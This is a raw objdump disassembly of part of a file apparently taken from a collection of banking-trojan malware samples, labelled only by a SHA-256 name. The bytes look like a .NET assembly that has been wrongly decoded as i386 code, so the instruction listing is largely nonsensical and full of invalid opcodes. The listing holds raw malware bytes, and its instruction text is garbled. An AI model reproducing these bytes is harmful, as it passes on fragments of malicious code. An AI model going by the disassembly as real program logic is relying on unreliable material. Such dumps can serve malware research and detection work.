
malware_samples/banker/c831e1128b9b981ef41f89f4e03c8a2a2a7c6fc7a53b78f03caad3c672754063.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	6b 50 00 00          	imul   $0x0,0x0(%eax),%edx
10002004:	00 00                	add    %al,(%eax)
10002006:	00 00                	add    %al,(%eax)
10002008:	48                   	dec    %eax
10002009:	00 00                	add    %al,(%eax)
1000200b:	00 02                	add    %al,(%edx)
1000200d:	00 05 00 98 24 00    	add    %al,0x249800
10002013:	00 0c 2b             	add    %cl,(%ebx,%ebp,1)
10002016:	00 00                	add    %al,(%eax)
10002018:	01 00                	add    %eax,(%eax)
	...
1000204e:	00 00                	add    %al,(%eax)
10002050:	1b 30                	sbb    (%eax),%esi
10002052:	0a 00                	or     (%eax),%al
10002054:	7a 01                	jp     0x10002057
10002056:	00 00                	add    %al,(%eax)
10002058:	01 00                	add    %eax,(%eax)
1000205a:	00 11                	add    %dl,(%ecx)
1000205c:	12 00                	adc    (%eax),%al
1000205e:	fe                   	(bad)
1000205f:	15 04 00 00 02       	adc    $0x2000004,%eax
10002064:	12 00                	adc    (%eax),%al
10002066:	06                   	push   %es
10002067:	28 01                	sub    %al,(%ecx)
10002069:	00 00                	add    %al,(%eax)
1000206b:	2b 7d 05             	sub    0x5(%ebp),%edi
1000206e:	00 00                	add    %al,(%eax)
10002070:	04 12                	add    $0x12,%al
10002072:	01 fe                	add    %edi,%esi
10002074:	15 03 00 00 02       	adc    $0x2000003,%eax
10002079:	28 08                	sub    %cl,(%eax)
1000207b:	00 00                	add    %al,(%eax)
1000207d:	06                   	push   %es
1000207e:	14 7e                	adc    $0x7e,%al
10002080:	11 00                	adc    %eax,(%eax)
10002082:	00 0a                	add    %cl,(%edx)
10002084:	7e 11                	jle    0x10002097
10002086:	00 00                	add    %al,(%eax)
10002088:	0a 16                	or     (%esi),%dl
1000208a:	1a 7e 11             	sbb    0x11(%esi),%bh
1000208d:	00 00                	add    %al,(%eax)
1000208f:	0a 14 12             	or     (%edx,%edx,1),%dl
10002092:	00 12                	add    %dl,(%edx)
10002094:	01 28                	add    %ebp,(%eax)
10002096:	06                   	push   %es
10002097:	00 00                	add    %al,(%eax)
10002099:	06                   	push   %es
1000209a:	2d 01 2a 00 07       	sub    $0x7002a01,%eax
1000209f:	7b 01                	jnp    0x100020a2
100020a1:	00 00                	add    %al,(%eax)
100020a3:	04 7e                	add    $0x7e,%al
100020a5:	11 00                	adc    %eax,(%eax)
100020a7:	00 0a                	add    %cl,(%edx)
100020a9:	03 8e 69 20 00 30    	add    0x30002069(%esi),%ecx
100020af:	00 00                	add    %al,(%eax)
100020b1:	1f                   	pop    %ds
100020b2:	40                   	inc    %eax
100020b3:	28 01                	sub    %al,(%ecx)
100020b5:	00 00                	add    %al,(%eax)
100020b7:	06                   	push   %es
100020b8:	0c 08                	or     $0x8,%al
100020ba:	7e 11                	jle    0x100020cd
100020bc:	00 00                	add    %al,(%eax)
100020be:	0a 28                	or     (%eax),%ch
100020c0:	12 00                	adc    (%eax),%al
100020c2:	00 0a                	add    %cl,(%edx)
100020c4:	2c 38                	sub    $0x38,%al
100020c6:	28 13                	sub    %dl,(%ebx)
100020c8:	00 00                	add    %al,(%eax)
100020ca:	0a 28                	or     (%eax),%ch
100020cc:	13 00                	adc    (%eax),%eax
100020ce:	00 0a                	add    %cl,(%edx)
100020d0:	72 01                	jb     0x100020d3
100020d2:	00 00                	add    %al,(%eax)
100020d4:	70 28                	jo     0x100020fe
100020d6:	14 00                	adc    $0x0,%al
100020d8:	00 0a                	add    %cl,(%edx)
100020da:	6f                   	outsl  %ds:(%esi),(%dx)
100020db:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100020e0:	d4 04                	aam    $0x4
100020e2:	00 70 72             	add    %dh,0x72(%eax)
100020e5:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100020ec:	00 0a                	add    %cl,(%edx)
100020ee:	28 14 00             	sub    %dl,(%eax,%eax,1)
100020f1:	00 0a                	add    %cl,(%edx)
100020f3:	6f                   	outsl  %ds:(%esi),(%dx)
100020f4:	15 00 00 0a 73       	adc    $0x730a0000,%eax
100020f9:	17                   	pop    %ss
100020fa:	00 00                	add    %al,(%eax)
100020fc:	0a 7a 07             	or     0x7(%edx),%bh
100020ff:	7b 01                	jnp    0x10002102
10002101:	00 00                	add    %al,(%eax)
10002103:	04 08                	add    $0x8,%al
10002105:	03 03                	add    (%ebx),%eax
10002107:	8e 69 12             	mov    0x12(%ecx),%gs
1000210a:	04 28                	add    $0x28,%al
1000210c:	05 00 00 06 2d       	add    $0x2d060000,%eax
10002111:	38 28                	cmp    %ch,(%eax)
10002113:	13 00                	adc    (%eax),%eax
10002115:	00 0a                	add    %cl,(%edx)
10002117:	28 13                	sub    %dl,(%ebx)
10002119:	00 00                	add    %al,(%eax)
1000211b:	0a 72 ec             	or     -0x14(%edx),%dh
1000211e:	04 00                	add    $0x0,%al
10002120:	70 28                	jo     0x1000214a
10002122:	14 00                	adc    $0x0,%al
10002124:	00 0a                	add    %cl,(%edx)
10002126:	6f                   	outsl  %ds:(%esi),(%dx)
10002127:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000212c:	af                   	scas   %es:(%edi),%eax
1000212d:	0a 00                	or     (%eax),%al
1000212f:	70 72                	jo     0x100021a3
10002131:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002138:	00 0a                	add    %cl,(%edx)
1000213a:	28 14 00             	sub    %dl,(%eax,%eax,1)
1000213d:	00 0a                	add    %cl,(%edx)
1000213f:	6f                   	outsl  %ds:(%esi),(%dx)
10002140:	15 00 00 0a 73       	adc    $0x730a0000,%eax
10002145:	17                   	pop    %ss
10002146:	00 00                	add    %al,(%eax)
10002148:	0a 7a 07             	or     0x7(%edx),%bh
1000214b:	7b 01                	jnp    0x1000214e
1000214d:	00 00                	add    %al,(%eax)
1000214f:	04 7e                	add    $0x7e,%al
10002151:	11 00                	adc    %eax,(%eax)
10002153:	00 0a                	add    %cl,(%edx)
10002155:	16                   	push   %ss
10002156:	08 7e 11             	or     %bh,0x11(%esi)
10002159:	00 00                	add    %al,(%eax)
1000215b:	0a 16                	or     (%esi),%dl
1000215d:	12 04 28             	adc    (%eax,%ebp,1),%al
10002160:	04 00                	add    $0x0,%al
10002162:	00 06                	add    %al,(%esi)
10002164:	0d 09 7e 11 00       	or     $0x117e09,%eax
10002169:	00 0a                	add    %cl,(%edx)
1000216b:	28 12                	sub    %dl,(%edx)
1000216d:	00 00                	add    %al,(%eax)
1000216f:	0a 2d 45 09 12 06    	or     0x6120945,%ch
10002175:	28 03                	sub    %al,(%ebx)
10002177:	00 00                	add    %al,(%eax)
10002179:	06                   	push   %es
1000217a:	2c 12                	sub    $0x12,%al
1000217c:	11 06                	adc    %eax,(%esi)
1000217e:	20 03                	and    %al,(%ebx)
10002180:	01 00                	add    %eax,(%eax)
10002182:	00 33                	add    %dh,(%ebx)
10002184:	0b 1f                	or     (%edi),%ebx
10002186:	64 28 18             	sub    %bl,%fs:(%eax)
10002189:	00 00                	add    %al,(%eax)
1000218b:	0a 2b                	or     (%ebx),%ch
1000218d:	e4 de                	in     $0xde,%al
1000218f:	45                   	inc    %ebp
10002190:	07                   	pop    %es
10002191:	7b 03                	jnp    0x10002196
10002193:	00 00                	add    %al,(%eax)
10002195:	04 28                	add    $0x28,%al
10002197:	19 00                	sbb    %eax,(%eax)
10002199:	00 0a                	add    %cl,(%edx)
1000219b:	13 05 11 05 6f 1a    	adc    0x1a6f0511,%eax
100021a1:	00 00                	add    %al,(%eax)
100021a3:	0a 16                	or     (%esi),%dl
100021a5:	fe 01                	incb   (%ecx)
100021a7:	2c 07                	sub    $0x7,%al
100021a9:	11 05 6f 1b 00 00    	adc    %eax,0x1b6f
100021af:	0a 09                	or     (%ecx),%cl
100021b1:	28 07                	sub    %al,(%edi)
100021b3:	00 00                	add    %al,(%eax)
100021b5:	06                   	push   %es
100021b6:	26 de 1c 26          	ficomps %es:(%esi,%eiz,1)
100021ba:	de 19                	ficomps (%ecx)
100021bc:	07                   	pop    %es
100021bd:	7b 01                	jnp    0x100021c0
100021bf:	00 00                	add    %al,(%eax)
100021c1:	04 28                	add    $0x28,%al
100021c3:	07                   	pop    %es
100021c4:	00 00                	add    %al,(%eax)
100021c6:	06                   	push   %es
100021c7:	26 07                	es pop %es
100021c9:	7b 02                	jnp    0x100021cd
100021cb:	00 00                	add    %al,(%eax)
100021cd:	04 28                	add    $0x28,%al
100021cf:	07                   	pop    %es
100021d0:	00 00                	add    %al,(%eax)
100021d2:	06                   	push   %es
100021d3:	26 dc 2a             	fsubrl %es:(%edx)
100021d6:	00 00                	add    %al,(%eax)
100021d8:	41                   	inc    %ecx
100021d9:	34 00                	xor    $0x0,%al
100021db:	00 00                	add    %al,(%eax)
100021dd:	00 00                	add    %al,(%eax)
100021df:	00 42 00             	add    %al,0x0(%edx)
100021e2:	00 00                	add    %al,(%eax)
100021e4:	1b 01                	sbb    (%ecx),%eax
100021e6:	00 00                	add    %al,(%eax)
100021e8:	5d                   	pop    %ebp
100021e9:	01 00                	add    %eax,(%eax)
100021eb:	00 03                	add    %al,(%ebx)
100021ed:	00 00                	add    %al,(%eax)
100021ef:	00 12                	add    %dl,(%edx)
100021f1:	00 00                	add    %al,(%eax)
100021f3:	01 02                	add    %eax,(%edx)
100021f5:	00 00                	add    %al,(%eax)
100021f7:	00 42 00             	add    %al,0x0(%edx)
100021fa:	00 00                	add    %al,(%eax)
100021fc:	1e                   	push   %ds
100021fd:	01 00                	add    %eax,(%eax)
100021ff:	00 60 01             	add    %ah,0x1(%eax)
10002202:	00 00                	add    %al,(%eax)
10002204:	19 00                	sbb    %eax,(%eax)
10002206:	00 00                	add    %al,(%eax)
10002208:	00 00                	add    %al,(%eax)
1000220a:	00 00                	add    %al,(%eax)
1000220c:	13 30                	adc    (%eax),%esi
1000220e:	07                   	pop    %es
1000220f:	00 62 02             	add    %ah,0x2(%edx)
10002212:	00 00                	add    %al,(%eax)
10002214:	02 00                	add    (%eax),%al
10002216:	00 11                	add    %dl,(%ecx)
10002218:	73 09                	jae    0x10002223
1000221a:	00 00                	add    %al,(%eax)
1000221c:	06                   	push   %es
1000221d:	0a 06                	or     (%esi),%al
1000221f:	73 1c                	jae    0x1000223d
10002221:	00 00                	add    %al,(%eax)
10002223:	0a 25 28 13 00 00    	or     0x1328,%ah
10002229:	0a 28                	or     (%eax),%ch
1000222b:	13 00                	adc    (%eax),%eax
1000222d:	00 0a                	add    %cl,(%edx)
1000222f:	72 c5                	jb     0x100021f6
10002231:	0a 00                	or     (%eax),%al
10002233:	70 28                	jo     0x1000225d
10002235:	14 00                	adc    $0x0,%al
10002237:	00 0a                	add    %cl,(%edx)
10002239:	6f                   	outsl  %ds:(%esi),(%dx)
1000223a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000223f:	78 0c                	js     0x1000224d
10002241:	00 70 72             	add    %dh,0x72(%eax)
10002244:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000224b:	00 0a                	add    %cl,(%edx)
1000224d:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002250:	00 0a                	add    %cl,(%edx)
10002252:	6f                   	outsl  %ds:(%esi),(%dx)
10002253:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002258:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
1000225d:	28 13                	sub    %dl,(%ebx)
1000225f:	00 00                	add    %al,(%eax)
10002261:	0a 28                	or     (%eax),%ch
10002263:	13 00                	adc    (%eax),%eax
10002265:	00 0a                	add    %cl,(%edx)
10002267:	72 8e                	jb     0x100021f7
10002269:	0c 00                	or     $0x0,%al
1000226b:	70 28                	jo     0x10002295
1000226d:	14 00                	adc    $0x0,%al
1000226f:	00 0a                	add    %cl,(%edx)
10002271:	6f                   	outsl  %ds:(%esi),(%dx)
10002272:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002277:	41                   	inc    %ecx
10002278:	0e                   	push   %cs
10002279:	00 70 72             	add    %dh,0x72(%eax)
1000227c:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002283:	00 0a                	add    %cl,(%edx)
10002285:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002288:	00 0a                	add    %cl,(%edx)
1000228a:	6f                   	outsl  %ds:(%esi),(%dx)
1000228b:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002290:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002295:	28 13                	sub    %dl,(%ebx)
10002297:	00 00                	add    %al,(%eax)
10002299:	0a 28                	or     (%eax),%ch
1000229b:	13 00                	adc    (%eax),%eax
1000229d:	00 0a                	add    %cl,(%edx)
1000229f:	72 57                	jb     0x100022f8
100022a1:	0e                   	push   %cs
100022a2:	00 70 28             	add    %dh,0x28(%eax)
100022a5:	14 00                	adc    $0x0,%al
100022a7:	00 0a                	add    %cl,(%edx)
100022a9:	6f                   	outsl  %ds:(%esi),(%dx)
100022aa:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100022af:	12 0f                	adc    (%edi),%cl
100022b1:	00 70 72             	add    %dh,0x72(%eax)
100022b4:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100022bb:	00 0a                	add    %cl,(%edx)
100022bd:	28 14 00             	sub    %dl,(%eax,%eax,1)
100022c0:	00 0a                	add    %cl,(%edx)
100022c2:	6f                   	outsl  %ds:(%esi),(%dx)
100022c3:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100022c8:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
100022cd:	28 13                	sub    %dl,(%ebx)
100022cf:	00 00                	add    %al,(%eax)
100022d1:	0a 28                	or     (%eax),%ch
100022d3:	13 00                	adc    (%eax),%eax
100022d5:	00 0a                	add    %cl,(%edx)
100022d7:	72 28                	jb     0x10002301
100022d9:	0f 00                	(bad)
100022db:	70 28                	jo     0x10002305
100022dd:	14 00                	adc    $0x0,%al
100022df:	00 0a                	add    %cl,(%edx)
100022e1:	6f                   	outsl  %ds:(%esi),(%dx)
100022e2:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100022e7:	e3 0f                	jecxz  0x100022f8
100022e9:	00 70 72             	add    %dh,0x72(%eax)
100022ec:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100022f3:	00 0a                	add    %cl,(%edx)
100022f5:	28 14 00             	sub    %dl,(%eax,%eax,1)
100022f8:	00 0a                	add    %cl,(%edx)
100022fa:	6f                   	outsl  %ds:(%esi),(%dx)
100022fb:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002300:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002305:	28 13                	sub    %dl,(%ebx)
10002307:	00 00                	add    %al,(%eax)
10002309:	0a 28                	or     (%eax),%ch
1000230b:	13 00                	adc    (%eax),%eax
1000230d:	00 0a                	add    %cl,(%edx)
1000230f:	72 f9                	jb     0x1000230a
10002311:	0f 00                	(bad)
10002313:	70 28                	jo     0x1000233d
10002315:	14 00                	adc    $0x0,%al
10002317:	00 0a                	add    %cl,(%edx)
10002319:	6f                   	outsl  %ds:(%esi),(%dx)
1000231a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000231f:	f4                   	hlt
10002320:	10 00                	adc    %al,(%eax)
10002322:	70 72                	jo     0x10002396
10002324:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000232b:	00 0a                	add    %cl,(%edx)
1000232d:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002330:	00 0a                	add    %cl,(%edx)
10002332:	6f                   	outsl  %ds:(%esi),(%dx)
10002333:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002338:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
1000233d:	28 13                	sub    %dl,(%ebx)
1000233f:	00 00                	add    %al,(%eax)
10002341:	0a 28                	or     (%eax),%ch
10002343:	13 00                	adc    (%eax),%eax
10002345:	00 0a                	add    %cl,(%edx)
10002347:	72 0a                	jb     0x10002353
10002349:	11 00                	adc    %eax,(%eax)
1000234b:	70 28                	jo     0x10002375
1000234d:	14 00                	adc    $0x0,%al
1000234f:	00 0a                	add    %cl,(%edx)
10002351:	6f                   	outsl  %ds:(%esi),(%dx)
10002352:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002357:	84 11                	test   %dl,(%ecx)
10002359:	00 70 72             	add    %dh,0x72(%eax)
1000235c:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002363:	00 0a                	add    %cl,(%edx)
10002365:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002368:	00 0a                	add    %cl,(%edx)
1000236a:	6f                   	outsl  %ds:(%esi),(%dx)
1000236b:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002370:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002375:	28 13                	sub    %dl,(%ebx)
10002377:	00 00                	add    %al,(%eax)
10002379:	0a 28                	or     (%eax),%ch
1000237b:	13 00                	adc    (%eax),%eax
1000237d:	00 0a                	add    %cl,(%edx)
1000237f:	72 9a                	jb     0x1000231b
10002381:	11 00                	adc    %eax,(%eax)
10002383:	70 28                	jo     0x100023ad
10002385:	14 00                	adc    $0x0,%al
10002387:	00 0a                	add    %cl,(%edx)
10002389:	6f                   	outsl  %ds:(%esi),(%dx)
1000238a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000238f:	0d 13 00 70 72       	or     $0x72700013,%eax
10002394:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000239b:	00 0a                	add    %cl,(%edx)
1000239d:	28 14 00             	sub    %dl,(%eax,%eax,1)
100023a0:	00 0a                	add    %cl,(%edx)
100023a2:	6f                   	outsl  %ds:(%esi),(%dx)
100023a3:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100023a8:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
100023ad:	28 13                	sub    %dl,(%ebx)
100023af:	00 00                	add    %al,(%eax)
100023b1:	0a 28                	or     (%eax),%ch
100023b3:	13 00                	adc    (%eax),%eax
100023b5:	00 0a                	add    %cl,(%edx)
100023b7:	72 23                	jb     0x100023dc
100023b9:	13 00                	adc    (%eax),%eax
100023bb:	70 28                	jo     0x100023e5
100023bd:	14 00                	adc    $0x0,%al
100023bf:	00 0a                	add    %cl,(%edx)
100023c1:	6f                   	outsl  %ds:(%esi),(%dx)
100023c2:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100023c7:	1e                   	push   %ds
100023c8:	14 00                	adc    $0x0,%al
100023ca:	70 72                	jo     0x1000243e
100023cc:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100023d3:	00 0a                	add    %cl,(%edx)
100023d5:	28 14 00             	sub    %dl,(%eax,%eax,1)
100023d8:	00 0a                	add    %cl,(%edx)
100023da:	6f                   	outsl  %ds:(%esi),(%dx)
100023db:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100023e0:	1d 00 00 0a 7d       	sbb    $0x7d0a0000,%eax
100023e5:	17                   	pop    %ss
100023e6:	00 00                	add    %al,(%eax)
100023e8:	04 28                	add    $0x28,%al
100023ea:	13 00                	adc    (%eax),%eax
100023ec:	00 0a                	add    %cl,(%edx)
100023ee:	28 13                	sub    %dl,(%ebx)
100023f0:	00 00                	add    %al,(%eax)
100023f2:	0a 72 34             	or     0x34(%edx),%dh
100023f5:	14 00                	adc    $0x0,%al
100023f7:	70 28                	jo     0x10002421
100023f9:	14 00                	adc    $0x0,%al
100023fb:	00 0a                	add    %cl,(%edx)
100023fd:	6f                   	outsl  %ds:(%esi),(%dx)
100023fe:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002403:	b7 19                	mov    $0x19,%bh
10002405:	00 70 72             	add    %dh,0x72(%eax)
10002408:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000240f:	00 0a                	add    %cl,(%edx)
10002411:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002414:	00 0a                	add    %cl,(%edx)
10002416:	6f                   	outsl  %ds:(%esi),(%dx)
10002417:	15 00 00 0a 28       	adc    $0x280a0000,%eax
1000241c:	13 00                	adc    (%eax),%eax
1000241e:	00 0a                	add    %cl,(%edx)
10002420:	28 13                	sub    %dl,(%ebx)
10002422:	00 00                	add    %al,(%eax)
10002424:	0a 72 cd             	or     -0x33(%edx),%dh
10002427:	19 00                	sbb    %eax,(%eax)
10002429:	70 28                	jo     0x10002453
1000242b:	14 00                	adc    $0x0,%al
1000242d:	00 0a                	add    %cl,(%edx)
1000242f:	6f                   	outsl  %ds:(%esi),(%dx)
10002430:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002435:	88 1a                	mov    %bl,(%edx)
10002437:	00 70 72             	add    %dh,0x72(%eax)
1000243a:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002441:	00 0a                	add    %cl,(%edx)
10002443:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002446:	00 0a                	add    %cl,(%edx)
10002448:	6f                   	outsl  %ds:(%esi),(%dx)
10002449:	15 00 00 0a 17       	adc    $0x170a0000,%eax
1000244e:	28 1e                	sub    %bl,(%esi)
10002450:	00 00                	add    %al,(%eax)
10002452:	0a 06                	or     (%esi),%al
10002454:	fe 06                	incb   (%esi)
10002456:	0a 00                	or     (%eax),%al
10002458:	00 06                	add    %al,(%esi)
1000245a:	73 1f                	jae    0x1000247b
1000245c:	00 00                	add    %al,(%eax)
1000245e:	0a 28                	or     (%eax),%ch
10002460:	02 00                	add    (%eax),%al
10002462:	00 2b                	add    %ch,(%ebx)
10002464:	28 03                	sub    %al,(%ebx)
10002466:	00 00                	add    %al,(%eax)
10002468:	2b 0b                	sub    (%ebx),%ecx
1000246a:	07                   	pop    %es
1000246b:	73 22                	jae    0x1000248f
1000246d:	00 00                	add    %al,(%eax)
1000246f:	0a 07                	or     (%edi),%al
10002471:	8e 69 6f             	mov    0x6f(%ecx),%gs
10002474:	23 00                	and    (%eax),%eax
10002476:	00 0a                	add    %cl,(%edx)
10002478:	9a 2a 1e 02 28 24 00 	lcall  $0x24,$0x28021e2a
1000247f:	00 0a                	add    %cl,(%edx)
10002481:	2a 4a 02             	sub    0x2(%edx),%cl
10002484:	7b 17                	jnp    0x1000249d
10002486:	00 00                	add    %al,(%eax)
10002488:	04 03                	add    $0x3,%al
1000248a:	28 25 00 00 0a 6f    	sub    %ah,0x6f0a0000
10002490:	26 00 00             	add    %al,%es:(%eax)
10002493:	0a 2a                	or     (%edx),%ch
10002495:	00 00                	add    %al,(%eax)
10002497:	00 42 53             	add    %al,0x53(%edx)
1000249a:	4a                   	dec    %edx
1000249b:	42                   	inc    %edx
1000249c:	01 00                	add    %eax,(%eax)
1000249e:	01 00                	add    %eax,(%eax)
100024a0:	00 00                	add    %al,(%eax)
100024a2:	00 00                	add    %al,(%eax)
100024a4:	0c 00                	or     $0x0,%al
100024a6:	00 00                	add    %al,(%eax)
100024a8:	76 34                	jbe    0x100024de
100024aa:	2e 30 2e             	xor    %ch,%cs:(%esi)
100024ad:	33 30                	xor    (%eax),%esi
100024af:	33 31                	xor    (%ecx),%esi
100024b1:	39 00                	cmp    %eax,(%eax)
100024b3:	00 00                	add    %al,(%eax)
100024b5:	00 05 00 6c 00 00    	add    %al,0x6c00
100024bb:	00 3c 05 00 00 23 7e 	add    %bh,0x7e230000(,%eax,1)
100024c2:	00 00                	add    %al,(%eax)
100024c4:	a8 05                	test   $0x5,%al
100024c6:	00 00                	add    %al,(%eax)
100024c8:	98                   	cwtl
100024c9:	08 00                	or     %al,(%eax)
100024cb:	00 23                	add    %ah,(%ebx)
100024cd:	53                   	push   %ebx
100024ce:	74 72                	je     0x10002542
100024d0:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
100024d7:	00 40 0e             	add    %al,0xe(%eax)
100024da:	00 00                	add    %al,(%eax)
100024dc:	a0 1a 00 00 23       	mov    0x2300001a,%al
100024e1:	55                   	push   %ebp
100024e2:	53                   	push   %ebx
100024e3:	00 e0                	add    %ah,%al
100024e5:	28 00                	sub    %al,(%eax)
100024e7:	00 10                	add    %dl,(%eax)
100024e9:	00 00                	add    %al,(%eax)
100024eb:	00 23                	add    %ah,(%ebx)
100024ed:	47                   	inc    %edi
100024ee:	55                   	push   %ebp
100024ef:	49                   	dec    %ecx
100024f0:	44                   	inc    %esp
100024f1:	00 00                	add    %al,(%eax)
100024f3:	00 f0                	add    %dh,%al
100024f5:	28 00                	sub    %al,(%eax)
100024f7:	00 1c 02             	add    %bl,(%edx,%eax,1)
100024fa:	00 00                	add    %al,(%eax)
100024fc:	23 42 6c             	and    0x6c(%edx),%eax
100024ff:	6f                   	outsl  %ds:(%esi),(%dx)
10002500:	62 00                	bound  %eax,(%eax)
10002502:	00 00                	add    %al,(%eax)
10002504:	00 00                	add    %al,(%eax)
10002506:	00 00                	add    %al,(%eax)
10002508:	02 00                	add    (%eax),%al
1000250a:	00 01                	add    %al,(%ecx)
1000250c:	57                   	push   %edi
1000250d:	15 02 1c 09 0a       	adc    $0xa091c02,%eax
10002512:	00 00                	add    %al,(%eax)
10002514:	00 fa                	add    %bh,%dl
10002516:	01 33                	add    %esi,(%ebx)
10002518:	00 16                	add    %dl,(%esi)
1000251a:	00 00                	add    %al,(%eax)
1000251c:	01 00                	add    %eax,(%eax)
1000251e:	00 00                	add    %al,(%eax)
10002520:	22 00                	and    (%eax),%al
10002522:	00 00                	add    %al,(%eax)
10002524:	05 00 00 00 17       	add    $0x17000000,%eax
10002529:	00 00                	add    %al,(%eax)
1000252b:	00 0a                	add    %cl,(%edx)
1000252d:	00 00                	add    %al,(%eax)
1000252f:	00 21                	add    %ah,(%ecx)
10002531:	00 00                	add    %al,(%eax)
10002533:	00 26                	add    %ah,(%esi)
10002535:	00 00                	add    %al,(%eax)
10002537:	00 10                	add    %dl,(%eax)
10002539:	00 00                	add    %al,(%eax)
1000253b:	00 02                	add    %al,(%edx)
1000253d:	00 00                	add    %al,(%eax)
1000253f:	00 01                	add    %al,(%ecx)
10002541:	00 00                	add    %al,(%eax)
10002543:	00 02                	add    %al,(%edx)
10002545:	00 00                	add    %al,(%eax)
10002547:	00 06                	add    %al,(%esi)
10002549:	00 00                	add    %al,(%eax)
1000254b:	00 01                	add    %al,(%ecx)
1000254d:	00 00                	add    %al,(%eax)
1000254f:	00 03                	add    %al,(%ebx)
10002551:	00 00                	add    %al,(%eax)
10002553:	00 03                	add    %al,(%ebx)
10002555:	00 00                	add    %al,(%eax)
10002557:	00 03                	add    %al,(%ebx)
10002559:	00 00                	add    %al,(%eax)
1000255b:	00 00                	add    %al,(%eax)
1000255d:	00 5f 06             	add    %bl,0x6(%edi)
10002560:	01 00                	add    %eax,(%eax)
10002562:	00 00                	add    %al,(%eax)
10002564:	00 00                	add    %al,(%eax)
10002566:	06                   	push   %es
10002567:	00 b8 04 89 07 06    	add    %bh,0x6078904(%eax)
1000256d:	00 25 05 89 07 06    	add    %ah,0x6078905
10002573:	00 ec                	add    %ch,%ah
10002575:	03 57 07             	add    0x7(%edi),%edx
10002578:	0f 00 a9 07 00 00 06 	verw   0x6000007(%ecx)
1000257f:	00 14 04             	add    %dl,(%esp,%eax,1)
10002582:	b1 06                	mov    $0x6,%cl
10002584:	06                   	push   %es
10002585:	00 9b 04 b1 06 06    	add    %bl,0x606b104(%ebx)
1000258b:	00 7c 04 b1          	add    %bh,-0x4f(%esp,%eax,1)
1000258f:	06                   	push   %es
10002590:	06                   	push   %es
10002591:	00 0c 05 b1 06 06 00 	add    %cl,0x606b1(,%eax,1)
10002598:	d8 04 b1             	fadds  (%ecx,%esi,4)
1000259b:	06                   	push   %es
1000259c:	06                   	push   %es
1000259d:	00 f1                	add    %dh,%cl
1000259f:	04 b1                	add    $0xb1,%al
100025a1:	06                   	push   %es
100025a2:	06                   	push   %es
100025a3:	00 2b                	add    %ch,(%ebx)
100025a5:	04 b1                	add    $0xb1,%al
100025a7:	06                   	push   %es
100025a8:	06                   	push   %es
100025a9:	00 00                	add    %al,(%eax)
100025ab:	04 6a                	add    $0x6a,%al
100025ad:	07                   	pop    %es
100025ae:	06                   	push   %es
100025af:	00 de                	add    %bl,%dh
100025b1:	03 6a 07             	add    0x7(%edx),%ebp
100025b4:	06                   	push   %es
100025b5:	00 5f 04             	add    %bl,0x4(%edi)
100025b8:	b1 06                	mov    $0x6,%cl
100025ba:	06                   	push   %es
100025bb:	00 46 04             	add    %al,0x4(%esi)
100025be:	9f                   	lahf
100025bf:	05 06 00 d8 07       	add    $0x7d80006,%eax
100025c4:	77 06                	ja     0x100025cc
100025c6:	0a 00                	or     (%eax),%al
100025c8:	d0 07                	rolb   $1,(%edi)
100025ca:	57                   	push   %edi
100025cb:	07                   	pop    %es
100025cc:	06                   	push   %es
100025cd:	00 d0                	add    %dl,%al
100025cf:	06                   	push   %es
100025d0:	77 06                	ja     0x100025d8
100025d2:	06                   	push   %es
100025d3:	00 c3                	add    %al,%bl
100025d5:	03 89 07 06 00 a7    	add    -0x58fff9f9(%ecx),%ecx
100025db:	03 77 06             	add    0x6(%edi),%esi
100025de:	06                   	push   %es
100025df:	00 89 00 12 03 06    	add    %cl,0x6031200(%ecx)
100025e5:	00 4a 06             	add    %cl,0x6(%edx)
100025e8:	6a 07                	push   $0x7
100025ea:	06                   	push   %es
100025eb:	00 3c 07             	add    %bh,(%edi,%eax,1)
100025ee:	77 06                	ja     0x100025f6
100025f0:	06                   	push   %es
